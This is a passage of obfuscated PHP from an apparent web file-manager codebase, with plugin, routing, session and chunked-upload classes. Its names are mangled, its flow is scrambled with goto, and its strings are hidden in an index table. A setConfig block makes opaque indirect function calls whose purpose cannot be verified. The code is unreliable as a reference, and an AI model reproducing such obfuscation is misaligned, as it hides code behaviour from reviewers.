$dÇáÍ×˜², $FªÓ› ´Ê¡); if (!is_array($FªÓ› ´Ê¡) || count($FªÓ› ´Ê¡) == 0 || !is_array($FªÓ› ´Ê¡[0]) || count($FªÓ› ´Ê¡[0]) == 0) { return; } $b‚ÉÓ‹¼–Œ = $this->getConfig(); goto EÆÇ¬£—åè; eÂİÍæÉ…‡: } private function parsePackage(&$E¿á¬ïæ´) { goto B¶ÍÅÔ‘¿; eó¤‚íŠñ: preg_match_all($C‡è‚¶ñœä[1350], $E¿á¬ïæ´, $DÍ¦›™Ä¶); if (!is_array($DÍ¦›™Ä¶) || count($DÍ¦›™Ä¶) == 0 || !is_array($DÍ¦›™Ä¶[0]) || count($DÍ¦›™Ä¶[0]) == 0) { return; } $DÌ‡Îé°Ô½ = $this->appPackage(); goto d¬îàŠù‚ó; A×ƒ„Ì­¯: $E¿á¬ïæ´ = str_replace($AÀÄ²é¼³, $B½Ü‹½ò¾ª, $E¿á¬ïæ´); goto F ¥²ö³ë¹; d¬îàŠù‚ó: $AÀÄ²é¼³ = array(); $B½Ü‹½ò¾ª = array(); foreach ($DÍ¦›™Ä¶[0] as $B÷´ŸíÕÊÃ) { $e«§è³ÃÉà = substr($B÷´ŸíÕÊÃ, strlen($b†ĞôÅ™¾), -2); $AÀÄ²é¼³[] = $B÷´ŸíÕÊÃ; $B½Ü‹½ò¾ª[] = _get($DÌ‡Îé°Ô½, $e«§è³ÃÉà); } goto A×ƒ„Ì­¯; B¶ÍÅÔ‘¿: $C‡è‚¶ñœä =& $_SERVER[¹÷ˆ§éÒ°ú]; $b†ĞôÅ™¾ = $C‡è‚¶ñœä[1349]; if (!strstr($E¿á¬ïæ´, $b†ĞôÅ™¾)) { return; } goto eó¤‚íŠñ; F ¥²ö³ë¹: } final function echoFile($c¦ˆö÷Šáó, $AÛ…Ø”‹¾À = false) { goto F÷£¸øÖÙ¤; F÷£¸øÖÙ¤: $c×šõ¨¤ãÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CƒŠÒ¸Ã’Û = $this->pluginPath . $c¦ˆö÷Šáó; if (ACT == $c×šõ¨¤ãÉ[1351]) { echo $c×šõ¨¤ãÉ[1352] . $this->pluginName . $c×šõ¨¤ãÉ[18] . $c¦ˆö÷Šáó . $c×šõ¨¤ãÉ[1353]; if (!file_exists($CƒŠÒ¸Ã’Û)) { echo $c×šõ¨¤ãÉ[1354]; return; } } goto a‘ªïˆ‘î‘; a‘ªïˆ‘î‘: $aÑ¼•Ü±® = $this->parseFile($CƒŠÒ¸Ã’Û); $this->parseLang($aÑ¼•Ü±®); $this->parseConfig($aÑ¼•Ü±®); goto EØ¬–áËîà; EØ¬–áËîà: $this->parsePackage($aÑ¼•Ü±®); if (is_array($AÛ…Ø”‹¾À)) { $aÑ¼•Ü±® = str_replace(array_keys($AÛ…Ø”‹¾À), array_values($AÛ…Ø”‹¾À), $aÑ¼•Ü±®); } echo $c×šõ¨¤ãÉ[10] . $aÑ¼•Ü±®; goto Fˆ½„ÍÀ„ö; Fˆ½„ÍÀ„ö: } final function initLang() { goto AĞâäÓæÆ; E›„ ¼ÂĞ‰: $D¶ÌÓ¸öÁÛ = I18n::getType(); $c²³×É†˜ = array(); if (file_exists($CÈ— ÆÑ£ë . $D¶ÌÓ¸öÁÛ . $b§÷§ñÄãß[760])) { $c²³×É†˜ = (include $CÈ— ÆÑ£ë . $D¶ÌÓ¸öÁÛ . $b§÷§ñÄãß[760]); } else { if ($D¶ÌÓ¸öÁÛ == $b§÷§ñÄãß[1357] && !file_exists($CÈ— ÆÑ£ë . $D¶ÌÓ¸öÁÛ . $b§÷§ñÄãß[760]) && file_exists($CÈ— ÆÑ£ë . $b§÷§ñÄãß[1358])) { $c²³×É†˜ = (include $CÈ— ÆÑ£ë . $b§÷§ñÄãß[1358]); } else { if (file_exists($CÈ— ÆÑ£ë . $BĞŞƒÊËÂ . $b§÷§ñÄãß[760])) { $c²³×É†˜ = (include $CÈ— ÆÑ£ë . $BĞŞƒÊËÂ . $b§÷§ñÄãß[760]); } } } goto c‘“Ú©Ÿ¢Ë; c‘“Ú©Ÿ¢Ë: if (!is_array($c²³×É†˜)) { return array(); } if (@count($c²³×É†˜) > 0) { I18n::set($c²³×É†˜); } return $c²³×É†˜; goto dŒ¼ÏÄäÕ; AĞâäÓæÆ: $b§÷§ñÄãß =& $_SERVER[¹÷ˆ§éÒ°ú]; $BĞŞƒÊËÂ = $b§÷§ñÄãß[1355]; $CÈ— ÆÑ£ë = $this->pluginPath . $b§÷§ñÄãß[1356]; goto E›„ ¼ÂĞ‰; dŒ¼ÏÄäÕ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Fâ†êè‰—Ú) { $dÇŸà³ïõä =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($_SERVER[$dÇŸà³ïõä[6]] != $_SERVER[$dÇŸà³ïõä[61]]) { goto DÆÔƒ¤©ˆ§; A¸á×Ğ’ÜÎ: $E¶èÅàÊø¦ = $dÇŸà³ïõä[783]; $E¶èÅàÊø¦($_SERVER[$dÇŸà³ïõä[784]]); $E¶èÅàÊø¦($_SERVER[$dÇŸà³ïõä[8]] . $dÇŸà³ïõä[1359]); goto C£åğ²˜ÃÖ; BºŸ„Ïğ¨Å: $eÂ˜×šÕ‡ = $fğåÇÛÇÇš($AÒÒç†çˆŸ); $b°Œ£¢Ú¯¥ = explode($dÇŸà³ïõä[10], $eÂ˜×šÕ‡); if (count($b°Œ£¢Ú¯¥) < $dÇŸà³ïõä[572]) { $C Àµ¶‘Ññ = $dÇŸà³ïõä[12]; $C Àµ¶‘Ññ(); } goto A¸á×Ğ’ÜÎ; C£åğ²˜ÃÖ: $CÚŞõ„ËŸà = 1; while ($CÚŞõ„ËŸà > 1) { $CÚŞõ„ËŸà = $CÚŞõ„ËŸà + 4; $b®¤Û¢ïùê = rawurlencode($CÚŞõ„ËŸà . $dÇŸà³ïõä[372]); } goto Eª–ÎéÓŠ; DÆÔƒ¤©ˆ§: $fÚ“÷£—œ¡ = $dÇŸà³ïõä[782]; $fğåÇÛÇÇš = $dÇŸà³ïõä[7]; $AÒÒç†çˆŸ = $_SERVER[$dÇŸà³ïõä[8]] . $dÇŸà³ïõä[9]; goto BºŸ„Ïğ¨Å; Eª–ÎéÓŠ: } return $this->modelPlugin->setConfig($this->pluginName, $Fâ†êè‰—Ú); } public function onSetConfig($b¢îƒ¯‹óø) { } public function onGetConfig($C½ÈïŒ˜ÀÒ) { } public function onChangeStatus($d†ïé–ÑÀõ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($dË ÖˆƒÇå = "\x70\x6c\165\x67\x69\x6e\x41\165\x74\x68") { $aİ³ê’‡œ× =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!defined($aİ³ê’‡œ×[438])) { return !1; } if (_get($GLOBALS, $aİ³ê’‡œ×[470])) { return !0; } $FòéÅ¤á›á = $this->getConfig(); if (!$FòéÅ¤á›á[$dË ÖˆƒÇå]) { return !1; } return ActionCall($aİ³ê’‡œ×[1360], $FòéÅ¤á›á[$dË ÖˆƒÇå]); } public function url($EÚºÄ¤…ºÂ, $c‘±…Ÿ­ï = '', $F´Ô‡ñÜ˜ = true) { goto d¾×Ôé£Ü; d¾×Ôé£Ü: $aÌ‘–§µ¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d»õ½•É’Œ = $this->getConfig(); $AÙ¿ï’è£– = KOD_VERSION . $aÌ‘–§µ¸[103] . KOD_VERSION_BUILD; goto C¶¸óïªë; Cìì ŠîÉ‹: if (!$F´Ô‡ñÜ˜) { return $bË®§šù¾ñ; } echo $bË®§šù¾ñ; goto EĞîòÖŒøš; C¶¸óïªë: $E³‘Ø¿¥ƒ = $this->packageVersion(); $Aš—ğ³é˜º = $AÙ¿ï’è£– . $aÌ‘–§µ¸[423] . $E³‘Ø¿¥ƒ; if (substr($EÚºÄ¤…ºÂ, 0, 4) == $aÌ‘–§µ¸[156] || substr($EÚºÄ¤…ºÂ, 0, 2) == $aÌ‘–§µ¸[1146]) { $bË®§šù¾ñ = $EÚºÄ¤…ºÂ . $aÌ‘–§µ¸[1361] . $Aš—ğ³é˜º; } else { if ($c‘±…Ÿ­ï == $aÌ‘–§µ¸[43]) { $bË®§šù¾ñ = $this->pluginHost . $EÚºÄ¤…ºÂ . $aÌ‘–§µ¸[1361] . $Aš—ğ³é˜º; } else { if ($c‘±…Ÿ­ï === $aÌ‘–§µ¸[88]) { $bË®§šù¾ñ = $this->pluginHost . $EÚºÄ¤…ºÂ; } else { if ($c‘±…Ÿ­ï == $aÌ‘–§µ¸[1362]) { $bË®§šù¾ñ = STATIC_PATH . $EÚºÄ¤…ºÂ . $aÌ‘–§µ¸[1361] . $AÙ¿ï’è£–; } else { if ($c‘±…Ÿ­ï == $aÌ‘–§µ¸[1363]) { $bË®§šù¾ñ = APP_HOST . $aÌ‘–§µ¸[1364] . $EÚºÄ¤…ºÂ . $aÌ‘–§µ¸[1361] . $AÙ¿ï’è£–; } else { if (isset($d»õ½•É’Œ[$c‘±…Ÿ­ï])) { $bË®§šù¾ñ = $d»õ½•É’Œ[$c‘±…Ÿ­ï] . $EÚºÄ¤…ºÂ . $aÌ‘–§µ¸[1361] . $Aš—ğ³é˜º; } } } } } } goto Cìì ŠîÉ‹; EĞîòÖŒøš: } public function link($d‹´¤¯Ëã– = false, $e´õÇÛ¤ = '') { $DöŒ”öŒï‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$d‹´¤¯Ëã–) { $this->link($DöŒ”öŒï‡[1365], $DöŒ”öŒï‡[1363]); $this->link($DöŒ”öŒï‡[1366], $DöŒ”öŒï‡[1362]); $this->link($DöŒ”öŒï‡[1367], $DöŒ”öŒï‡[1362]); $this->link($DöŒ”öŒï‡[1368], $DöŒ”öŒï‡[1362]); $this->link($DöŒ”öŒï‡[1369], $DöŒ”öŒï‡[1362]); return; } $E·šÃª½¡ = $this->url($d‹´¤¯Ëã–, $e´õÇÛ¤, !1); if (substr($d‹´¤¯Ëã–, -3) == $DöŒ”öŒï‡[1370]) { echo $DöŒ”öŒï‡[1371] . $E·šÃª½¡ . $DöŒ”öŒï‡[1372] . $DöŒ”öŒï‡[10]; } else { if (substr($d‹´¤¯Ëã–, -4) == $DöŒ”öŒï‡[1373]) { echo $DöŒ”öŒï‡[1374] . $E·šÃª½¡ . $DöŒ”öŒï‡[1375] . $DöŒ”öŒï‡[10]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\x2f\x5d\53", "\72\x6e\165\x6d" => "\133\x30\x2d\x39\x5d\53", "\x3a\141\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($BÖØ‹“’Ï, $Eô©ç·œ) { $cÆöèÓ¸œ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($BÖØ‹“’Ï == $cÆöèÓ¸œ[1376]) { $E›÷’ÃÂ¬Œ = array_map($cÆöèÓ¸œ[1377], $Eô©ç·œ[0]); $cƒâ°ì»¤Ö = strpos($Eô©ç·œ[1], $cÆöèÓ¸œ[18]) === 0 ? $Eô©ç·œ[1] : $cÆöèÓ¸œ[18] . $Eô©ç·œ[1]; $fŠ™ØïÕ‘Œ = $Eô©ç·œ[2]; } else { $E›÷’ÃÂ¬Œ = null; $cƒâ°ì»¤Ö = strpos($Eô©ç·œ[0], $cÆöèÓ¸œ[18]) === 0 ? $Eô©ç·œ[0] : $cÆöèÓ¸œ[18] . $Eô©ç·œ[0]; $fŠ™ØïÕ‘Œ = $Eô©ç·œ[1]; } array_push(self::$maps, $E›÷’ÃÂ¬Œ); array_push(self::$routes, $cƒâ°ì»¤Ö); array_push(self::$methods, strtoupper($BÖØ‹“’Ï)); array_push(self::$callbacks, $fŠ™ØïÕ‘Œ); } public static function error($CîÌˆÏ¤Ş) { self::$errorCallback = $CîÌˆÏ¤Ş; } public static function haltOnMatch($D–À²Í÷°ã = true) { self::$halts = $D–À²Í÷°ã; } public static function dispatch() { goto d•Çê°ˆÙ…; eœ¾Û­ä±: $fÑ¡®´éø¯ = array_keys(static::$patterns); $c»Ë‚„Áæõ = array_values(static::$patterns); $dÌÙĞç²¿Ù = !1; goto aØ‚¿ùâğø; aØ‚¿ùâğø: self::$routes = preg_replace($aØ‰æ°‚[1064], $aØ‰æ°‚[18], self::$routes); if (in_array($eÃ¹Ì‹Š•Ø, self::$routes)) { $Añ¦Šã„ã¶ = array_keys(self::$routes, $eÃ¹Ì‹Š•Ø); foreach ($Añ¦Šã„ã¶ as $C Ö‘êİàÄ) { if (self::$methods[$C Ö‘êİàÄ] == $E½™’èŞßÇ || self::$methods[$C Ö‘êİàÄ] == $aØ‰æ°‚[1379] || in_array($E½™’èŞßÇ, self::$maps[$C Ö‘êİàÄ])) { $dÌÙĞç²¿Ù = !0; if (!is_object(self::$callbacks[$C Ö‘êİàÄ])) { $d‚É‰¡øë˜ = explode($aØ‰æ°‚[18], self::$callbacks[$C Ö‘êİàÄ]); $b¸ã§±Éó× = end($d‚É‰¡øë˜); $CºÃ‡À½ˆÊ = explode($aØ‰æ°‚[1380], $b¸ã§±Éó×); $dÆéÙê»ó = new $CºÃ‡À½ˆÊ[0](); $dÆéÙê»ó->{$CºÃ‡À½ˆÊ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$C Ö‘êİàÄ]); if (self::$halts) { return; } } } } } else { $CŞó÷Üâ•ö = 0; foreach (self::$routes as $C Ö‘êİàÄ) { if (strpos($C Ö‘êİàÄ, $aØ‰æ°‚[14]) !== !1) { $C Ö‘êİàÄ = str_replace($fÑ¡®´éø¯, $c»Ë‚„Áæõ, $C Ö‘êİàÄ); } if (preg_match($aØ‰æ°‚[1381] . $C Ö‘êİàÄ . $aØ‰æ°‚[1382], $eÃ¹Ì‹Š•Ø, $BŒìÄÁçœ²)) { if (self::$methods[$CŞó÷Üâ•ö] == $E½™’èŞßÇ || self::$methods[$CŞó÷Üâ•ö] == $aØ‰æ°‚[1379] || !empty(self::$maps[$CŞó÷Üâ•ö]) && in_array($E½™’èŞßÇ, self::$maps[$CŞó÷Üâ•ö])) { $dÌÙĞç²¿Ù = !0; array_shift($BŒìÄÁçœ²); if (!is_object(self::$callbacks[$CŞó÷Üâ•ö])) { $d‚É‰¡øë˜ = explode($aØ‰æ°‚[18], self::$callbacks[$CŞó÷Üâ•ö]); $b¸ã§±Éó× = end($d‚É‰¡øë˜); $CºÃ‡À½ˆÊ = explode($aØ‰æ°‚[1380], $b¸ã§±Éó×); $dÆéÙê»ó = new $CºÃ‡À½ˆÊ[0](); if (!method_exists($dÆéÙê»ó, $CºÃ‡À½ˆÊ[1])) { echo $aØ‰æ°‚[1383]; } else { call_user_func_array(array($dÆéÙê»ó, $CºÃ‡À½ˆÊ[1]), $BŒìÄÁçœ²); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$CŞó÷Üâ•ö], $BŒìÄÁçœ²); if (self::$halts) { return; } } } } $CŞó÷Üâ•ö++; } } if ($dÌÙĞç²¿Ù == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $B÷êÆãË‹¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; header($_SERVER[$B÷êÆãË‹¥[1384]] . $B÷êÆãË‹¥[1385]); echo $B÷êÆãË‹¥[1386]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aØ‰æ°‚[1378]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto F¹¦šÓ‚; d•Çê°ˆÙ…: $aØ‰æ°‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÃ¹Ì‹Š•Ø = parse_url($_SERVER[$aØ‰æ°‚[1378]], PHP_URL_PATH); $E½™’èŞßÇ = $_SERVER[$aØ‰æ°‚[166]]; goto eœ¾Û­ä±; F¹¦šÓ‚: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aœãÎÚíŸÇ; Bæğâãšì”: $eÒ£ä‘“ = $EÕğ÷Ä­³[$Fõæ˜Ñ·—Ó]; $b…ÖÙä…ğ“ = $EÕğ÷Ä­³[$DÛŒÆ“×õõ[750]]; switch ($Fõæ˜Ñ·—Ó) { case $DÛŒÆ“×õõ[27]: self::$handle = Model($DÛŒÆ“×õõ[751]); break; case $DÛŒÆ“×õõ[752]: self::$handle = new CacheRedis($eÒ£ä‘“, $b…ÖÙä…ğ“); break; case $DÛŒÆ“×õõ[753]: self::$handle = new CacheMemcached($eÒ£ä‘“, $b…ÖÙä…ğ“); break; case $DÛŒÆ“×õõ[179]: $eÒ£ä‘“[$DÛŒÆ“×õõ[87]] = $eÒ£ä‘“[$DÛŒÆ“×õõ[87]] . $DÛŒÆ“×õõ[1390]; self::$handle = new CacheFile($eÒ£ä‘“, $b…ÖÙä…ğ“); default: break; } goto F…—ï„©ß”; aœãÎÚíŸÇ: $DÛŒÆ“×õõ =& $_SERVER[¹÷ˆ§éÒ°ú]; static $E„Ï¦™Ş†‘ = false; if ($E„Ï¦™Ş†‘) { return $E„Ï¦™Ş†‘; } goto C¡ºÅ«ÚÙ­; F…—ï„©ß”: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $E„Ï¦™Ş†‘ = new self(); return $E„Ï¦™Ş†‘; goto eÏ˜µÑÊÓ„; C¡ºÅ«ÚÙ­: $EÕğ÷Ä­³ = $GLOBALS[$DÛŒÆ“×õõ[16]][$DÛŒÆ“×õõ[348]]; self::$sessionTime = $EÕğ÷Ä­³[$DÛŒÆ“×õõ[1387]]; $cßĞË¹¯è = isset($GLOBALS[$DÛŒÆ“×õõ[1388]]) ? $GLOBALS[$DÛŒÆ“×õõ[1388]] : SESSION_ID; goto fˆÁùŒîº; fˆÁùŒîº: if (self::$sessionSign) { } else { if (Cookie::get($cßĞË¹¯è)) { self::$sessionSign = Cookie::get($cßĞË¹¯è); } else { self::$sessionSign = guid(); } } Cookie::setSafe($cßĞË¹¯è, self::$sessionSign, self::$sessionTime); $Fõæ˜Ñ·—Ó = $EÕğ÷Ä­³[$DÛŒÆ“×õõ[1389]]; goto Bæğâãšì”; eÏ˜µÑÊÓ„: } public static function sign($BŒù‡„À‚‘ = false) { $BŒù‡„À‚‘ && (self::$sessionSign = $BŒù‡„À‚‘); self::init(); return self::$sessionSign; } public static function set($FÆíÔ—¦, $CÄåõÜ¥‹† = false) { self::init(); if (is_array($FÆíÔ—¦)) { foreach ($FÆíÔ—¦ as $FÂ›¹µ©¶ => $b²´›¯Ÿõˆ) { array_set_value(self::$data, $FÂ›¹µ©¶, $b²´›¯Ÿõˆ); } } else { array_set_value(self::$data, $FÆíÔ—¦, $CÄåõÜ¥‹†); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($DÄª›œÀ¥  = false) { self::init(); if (!$DÄª›œÀ¥ ) { return self::$data; } return array_get_value(self::$data, $DÄª›œÀ¥ ); } public static function remove($Cƒ£ÙÅ¾Á£) { self::init(); unset(self::$data[$Cƒ£ÙÅ¾Á£]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹÷ˆ§éÒ°ú][755])) { self::$handle->clearTimeout(); } } } goto A‹Á–Ü÷¦ğ; eß•êÁíˆ: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto A…öİ¦„; bŠ‰™¤»¦: if (!empty($_FILES)) { $DØÅ˜§¨È¬ = $_FILES[$eÅàÆ‹¤Óï[179]]; $this->uploadFile = $DØÅ˜§¨È¬[$eÅàÆ‹¤Óï[1960]]; if (!$this->uploadFile && $DØÅ˜§¨È¬[$eÅàÆ‹¤Óï[1210]] > 0) { show_json($this->errorInfo($DØÅ˜§¨È¬[$eÅàÆ‹¤Óï[1210]]), !1); } } else { if (isset($in[$eÅàÆ‹¤Óï[397]])) { $this->uploadFile = isset($in[$eÅàÆ‹¤Óï[1961]]) ? $eÅàÆ‹¤Óï[1962] : $eÅàÆ‹¤Óï[1805]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Bïè¹ÚÜ”; Bïè¹ÚÜ”: $this->checkSize(); $this->tempPathInit(); goto CİÛßØÙËÎ; A…öİ¦„: $eÅàÆ‹¤Óï =& $_SERVER[¹÷ˆ§éÒ°ú]; global $in; $this->in =& $in; goto bŠ‰™¤»¦; CİÛßØÙËÎ: } public function upload() { goto aƒŞ¡íèö‘; AÍó†‘ä´Š: CacheLock::unlock($this->tempFile); return $this->tempFile; goto C»† ŠéÔÈ; C‡¤¤‰ï‚³: ignore_timeout(); if (!$this->checkChunkHash($D‰õÀöÅã˜)) { $this->showJson($F‚°¨¹ÕªŒ[1977], !1); } $this->statusSet(!1); goto AÍó†‘ä´Š; dê‹”º­²å: if ($A×©¾›ÉÇ¬ > 1 && $cöá‡èÇó¡ <= 0) { show_json($F‚°¨¹ÕªŒ[1967], !1); } if ($cöá‡èÇó¡ > $Eó‰ó×äµ) { $A×©¾›ÉÇ¬ = 1; } if ($A×©¾›ÉÇ¬ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto e°ßö¬Ë‚; C½¥‡‘—÷É: $D‰õÀöÅã˜[$F‚°¨¹ÕªŒ[1973]][$F‚°¨¹ÕªŒ[1974] . $FÑÏ–ÏÍãò] = array($F‚°¨¹ÕªŒ[1975] => $Aß¥¥”©À’, $F‚°¨¹ÕªŒ[1027] => $FÑÏ–ÏÍãò, $F‚°¨¹ÕªŒ[89] => $Eó‰ó×äµ, $F‚°¨¹ÕªŒ[176] => $EºÓÜˆ²Şº); $this->statusSet($D‰õÀöÅã˜); if (count($D‰õÀöÅã˜[$F‚°¨¹ÕªŒ[1973]]) != $D‰õÀöÅã˜[$F‚°¨¹ÕªŒ[1972]]) { $this->showJson($F‚°¨¹ÕªŒ[1976] . $FÑÏ–ÏÍãò, !0); } goto C‡¤¤‰ï‚³; e°ßö¬Ë‚: CacheLock::lock($this->tempFile, 20); $D‰õÀöÅã˜ = $this->statusGet(); $this->initFileTemp(); goto fŠ–Ñ¤³Ô; dÒ”ÌÉ¢‚£: $f„ÑšÉõÁ‰ = $this->tempFile . $F‚°¨¹ÕªŒ[1965] . $FÑÏ–ÏÍãò; $Eó‰ó×äµ = isset($this->in[$F‚°¨¹ÕªŒ[533]]) ? intval($this->in[$F‚°¨¹ÕªŒ[533]]) : 0; $cöá‡èÇó¡ = isset($this->in[$F‚°¨¹ÕªŒ[1966]]) ? intval($this->in[$F‚°¨¹ÕªŒ[1966]]) : 0; goto dê‹”º­²å; a ô‚‚´×Ü: @unlink($cÕÎ×”•†); if (!$DˆˆäÄÛÇˆ) { $this->showJson($F‚°¨¹ÕªŒ[1971] . $FÑÏ–ÏÍãò, !1); } $D‰õÀöÅã˜[$F‚°¨¹ÕªŒ[1972]] = $A×©¾›ÉÇ¬; goto C½¥‡‘—÷É; D¹íÅÏÚæ: $Aß¥¥”©À’ = $FÑÏ–ÏÍãò * $cöá‡èÇó¡; $dÅó®„¹’‹ = @fopen($this->tempFile, $F‚°¨¹ÕªŒ[1970]); fseek($dÅó®„¹’‹, $Aß¥¥”©À’); goto eÛÅ÷‡‘¨”; fŠ–Ñ¤³Ô: $cÕÎ×”•† = $this->moveUploadedFile($f„ÑšÉõÁ‰); if ($Eó‰ó×äµ > 0 && filesize($cÕÎ×”•†) == 0) { $this->showJson($F‚°¨¹ÕªŒ[1968], !1); } if (!$cÕÎ×”•†) { $this->showJson(LNG($F‚°¨¹ÕªŒ[1969]), !1); } goto D¹íÅÏÚæ; aƒŞ¡íèö‘: $F‚°¨¹ÕªŒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÑÏ–ÏÍãò = isset($this->in[$F‚°¨¹ÕªŒ[1963]]) ? intval($this->in[$F‚°¨¹ÕªŒ[1963]]) : 0; $A×©¾›ÉÇ¬ = isset($this->in[$F‚°¨¹ÕªŒ[1964]]) ? intval($this->in[$F‚°¨¹ÕªŒ[1964]]) : 1; goto dÒ”ÌÉ¢‚£; eÛÅ÷‡‘¨”: $DˆˆäÄÛÇˆ = $this->writeTo($cÕÎ×”•†, $dÅó®„¹’‹, $this->tempFile); $EºÓÜˆ²Şº = IO::hashSimple($cÕÎ×”•†); $Eó‰ó×äµ = IO::size($cÕÎ×”•†); goto a ô‚‚´×Ü; C»† ŠéÔÈ: } private function checkSize() { $a­Çâ•îÂ« =& $_SERVER[¹÷ˆ§éÒ°ú]; if (phpBuild64() || $this->in[$a­Çâ•îÂ«[89]] < PHP_INT_MAX) { return; } show_json(LNG($a­Çâ•îÂ«[1978]), !1); } private function showJson($bÅ—™ˆæ¡, $eóøÌÅˆ÷) { CacheLock::unlock($this->tempFile); if (!$eóøÌÅˆ÷) { return show_json($bÅ—™ˆæ¡, $eóøÌÅˆ÷); } show_json($bÅ—™ˆæ¡, $eóøÌÅˆ÷); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto dèä½èŸóñ; aŠçÍˆ­¼Ç: touch($b ÓÙ… ÆÖ . $BÅˆˆœ¸Ã[1979]); $aâ·Úù›í¡ = isset($this->in[$BÅˆˆœ¸Ã[1980]]) ? $this->in[$BÅˆˆœ¸Ã[1980]] : !1; if (strlen($aâ·Úù›í¡) < 30) { $aâ·Úù›í¡ = md5(USER_ID . $this->in[$BÅˆˆœ¸Ã[87]] . $this->fileName . $this->in[$BÅˆˆœ¸Ã[89]]); } goto cò…Ù¶Çõî; cò…Ù¶Çõî: $this->tempFile = $b ÓÙ… ÆÖ . $BÅˆˆœ¸Ã[1981] . md5($aâ·Úù›í¡ . $this->in[$BÅˆˆœ¸Ã[1522]]); goto c´Ó­ôˆÊ›; dèä½èŸóñ: $BÅˆˆœ¸Ã =& $_SERVER[¹÷ˆ§éÒ°ú]; $b ÓÙ… ÆÖ = TEMP_FILES; @mk_dir($b ÓÙ… ÆÖ); goto aŠçÍˆ­¼Ç; c´Ó­ôˆÊ›: } private function moveUploadedFile($CÌíˆÊƒì¿) { $FØÌÒ„†ïÓ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C®ºÉÒÖç¼ = $this->uploadFile; if ($C®ºÉÒÖç¼ == $FØÌÒ„†ïÓ[1982]) { @file_put_contents($CÌíˆÊƒì¿, base64_decode($_REQUEST[$FØÌÒ„†ïÓ[1983]])); } else { if ($C®ºÉÒÖç¼ == $FØÌÒ„†ïÓ[1805]) { $B½îİÁ‹ˆŞ = @fopen($CÌíˆÊƒì¿, $FØÌÒ„†ïÓ[1512]); $this->writeTo($C®ºÉÒÖç¼, $B½îİÁ‹ˆŞ, $CÌíˆÊƒì¿); } else { if (!move_uploaded_file($C®ºÉÒÖç¼, $CÌíˆÊƒì¿)) { return !1; } } } return $CÌíˆÊƒì¿; } private function writeTo($a„Ğ³„†Ñí, $C¼°ƒ‚Ù¦Ù, $cÉ¶Í„Ë¡‚) { goto A‰ë•óŞÒ•; aİÁÁ°Ì: fclose($EÆàí¡À‘É); fclose($C¼°ƒ‚Ù¦Ù); CacheLock::unlock($C¥Ä²Œ‰); goto E˜¡¢ßĞÅ; D³ËŒ”Ô“î: $EÆàí¡À‘É = @fopen($a„Ğ³„†Ñí, $fÀ¾Š‚ß[1511]); if (!$EÆàí¡À‘É || !$C¼°ƒ‚Ù¦Ù || !$fØÏ¢¨Ø¹) { CacheLock::unlock($C¥Ä²Œ‰); return !1; } while (!feof($EÆàí¡À‘É)) { fwrite($C¼°ƒ‚Ù¦Ù, fread($EÆàí¡À‘É, 1024 * 200)); } goto aİÁÁ°Ì; A‰ë•óŞÒ•: $fÀ¾Š‚ß =& $_SERVER[¹÷ˆ§éÒ°ú]; $C¥Ä²Œ‰ = $fÀ¾Š‚ß[1984] . $cÉ¶Í„Ë¡‚; $fØÏ¢¨Ø¹ = CacheLock::lock($C¥Ä²Œ‰, 1); goto D³ËŒ”Ô“î; E˜¡¢ßĞÅ: return !0; goto AùÑÉÛğ¿ğ; AùÑÉÛğ¿ğ: } private function statusGet() { goto Fø¦Í…·«Õ; fœëŸÍ¿Ó†: if (!$this->statusData) { $C³é¥‰Îƒ = array($fÉ§îÙÀ°Ã[38] => $this->fileName, $fÉ§îÙÀ°Ã[1972] => 0, $fÉ§îÙÀ°Ã[1973] => array()); $this->statusSet($C³é¥‰Îƒ); } return $this->statusData; goto f Û•Ò‰Œë; Aµä¦˜»“˜: $c‡åµ±õÈ = !1; if (file_exists($CºŒÚæì¡Â)) { $c‡åµ±õÈ = @file_get_contents($CºŒÚæì¡Â); } if ($c‡åµ±õÈ) { $this->statusData = json_decode($c‡åµ±õÈ, !0); } goto fœëŸÍ¿Ó†; Fø¦Í…·«Õ: $fÉ§îÙÀ°Ã =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_array($this->statusData)) { return $this->statusData; } $CºŒÚæì¡Â = $this->tempFile . $fÉ§îÙÀ°Ã[1985]; goto Aµä¦˜»“˜; f Û•Ò‰Œë: } public function statusSet($AÕ“ØàÖ) { $F¦±¡ ó› = 